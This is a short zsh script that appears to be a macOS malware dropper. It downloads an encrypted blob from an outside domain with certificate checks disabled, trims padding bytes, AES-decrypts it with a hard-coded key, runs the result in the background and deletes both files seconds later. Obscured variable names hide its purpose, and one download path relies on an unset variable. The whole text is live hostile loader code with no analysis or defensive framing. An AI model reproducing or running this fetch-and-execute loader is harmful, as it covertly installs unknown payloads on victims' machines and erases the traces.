#!/bin/zsh
ynard=$(mktemp /tmp/sq2wp3.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/mf35373fadae5b471.bin" -o "$ynardz" || exit 1
sv5gdz=$(stat -f %z "$ynardz"); sr7yqt8=$(( sv5gdz - 3383 - 3177 ))
tail -c +$(( 3383 + 1 )) "$ynardz" | head -c $sr7yqt8 | openssl enc -d -aes-256-cbc -k ae87fb4e1489ac383758f28b -out "$ynard" 2>/dev/null
[ -s "$ynard" ] && chmod 700 "$ynard" && ( "$ynard" & ) && disown
( sleep 3; rm -f "$ynard" "$ynardz" ) &>/dev/null &
